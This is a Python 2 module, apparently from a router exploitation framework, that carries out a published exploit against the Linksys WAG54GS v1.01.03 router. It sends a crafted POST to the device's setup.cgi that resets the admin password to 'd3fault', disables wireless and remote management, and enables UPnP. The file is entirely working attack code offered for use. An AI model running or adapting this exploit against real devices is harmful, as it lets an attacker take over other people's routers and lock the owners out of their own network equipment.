import urllib
import util
from ..router_vuln import RouterVuln


class wag54gs_change_admin(RouterVuln):

    def __init__(self):
        self.router = 'WAG54GS v1.01.03'
        self.vuln   = 'Change Admin Password'
        super(wag54gs_change_admin, self).__init__()
    
        self.info = """
                    Change the admin password to d3fault.
                    http://www.exploit-db.com/exploits/18503/
                    """

    def initialize(self):
        util.Msg('Changing admin password to \'d3fault\'...')
        try:
            url = 'http://%s/setup.cgi' % self.config['target'].value
            params = urllib.urlencode({'user_list':'1','sysname':'admin','sysPasswd':'d3fault',
                    'sysConfirmPasswd':'d3fault','remote_management':'disable',
                    'devname':'','snmp_enable':'disable','upnp_enable':'enable',
                    'wlan_enable':'disable','save':'Save+Settings','h_user_list':'1',
                    'h_pwset':'yes','sysname_changed':'no','pwchanged':'yes',
                    'pass_is_default':'false','pass_is_none':'no','h_remote_management':'disable',
                    'c4_trap_ip':'','h_snmp_enable':'disable','h_upnp_enable':'enable',
                    'h_wlan_enable':'disable','todo':'save','this_file':'Administration.htm',
                    'next_file':'Administration.htm','message':''})

            response = urllib.urlopen(url, params).read()
            print response
            util.Msg('Done.  Password reset to \'d3fault\'')
        except Exception, e:
            util.Error('Error: %s' % e)
